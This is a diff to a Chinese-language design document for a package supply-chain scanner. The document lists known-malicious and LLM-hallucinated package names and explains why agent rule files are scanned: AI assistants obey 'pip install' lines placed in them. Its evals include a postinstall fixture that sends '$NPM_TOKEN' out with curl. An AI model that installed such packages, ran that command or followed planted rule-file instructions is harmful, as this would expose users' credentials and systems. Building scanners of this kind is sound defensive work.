@@ -83,7 +83,7 @@ def suspicious(name, popular):
 ```
 
 - 命中 → `vibesec.g1.hallucinated-package`（blocking），finding.notes 記 `looks_like`。
-- `blacklist.yaml` 的 `status` 分三類：`confirmed_malicious`（曾被下架 / CERT 證實，例如 `crossenv`、`colourama`、`jeIlyfish`、`torchtriton`）、`hallucination_prone`（`axois`、`reqeusts`、`python-dotenv-env`、`yaml`、`beautifulsoup`）、`confusable_legit`（真實存在但易混淆，例如 `huggingface-cli` 應為 `huggingface-hub`、`sklearn` 應為 `scikit-learn`、`pytorch` 應為 `torch`）。
+- `blacklist.yaml` 的 `status` 分三類：`confirmed_malicious`（曾被下架 / CERT 證實，例如 `crossenv`、`colourama`、`jeIlyfish`、`torchtriton`）、`hallucination_prone`（`axois`、`reqeusts`、`python-dotenv-env`、`yaml`、`beautifulsoup`；`huggingface-cli` 也是 LLM 常捏造的名稱，PyPI 上並不存在，真正提供該指令的套件是 `huggingface-hub`）、`confusable_legit`（真實存在但易混淆，例如 `sklearn` 應為 `scikit-learn`、`pytorch` 應為 `torch`）。
 - **規則檔也要掃**（`scan_agent_rule_files: [".cursorrules", "AGENTS.md", "SKILL.md", "**/*.md"]`）：AI 助手會「照做」規則檔裡的 `pip install foo`；在這些檔案發現未知 / 黑名單套件 → `vibesec.g1.rules-file-unknown-package`。同時這一步順便執行 G4 的隱形 Unicode 掃描（`VS-G4-RULES-FILE-UNICODE`）。
 
 ### 第 3 層：安裝鉤子
@@ -186,7 +186,7 @@ curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabi
 
 ## 驗證方式
 
-1. **正例 / 反例（`evals/`）**：lockfile 含 `axois` → block；含 `axios` 最新版但發布 3 天 → cooldown block；含 allowlist 內緊急版本 → pass 並附 ticket；`.cursorrules` 含 `pip install huggingface-cli` → block。
+1. **正例 / 反例（`evals/`）**：lockfile 含 `axois` → block；含 `axios` 最新版但發布 3 天 → cooldown block；含 allowlist 內緊急版本 → pass 並附 ticket；`.cursorrules` 指示以 pip 安裝幻覺套件 `huggingface-cli` → block（案例描述刻意不寫成可執行指令，避免文件本身被規則檔掃描命中或被 AI 助手照做）。
 2. **安裝鉤子 fixture**：假 tarball 的 postinstall 含 `curl … $NPM_TOKEN` → `vibesec.g1.postinstall-egress`。
 3. **Registry 失敗模擬**：封鎖 `registry.npmjs.org` → G1 `incomplete`，summary 顯示紅字而非綠勾。
 4. **SBOM 可重現**：同一 commit 兩次產出的 CycloneDX `components[]` 集合相同（忽略 timestamp / serialNumber）。
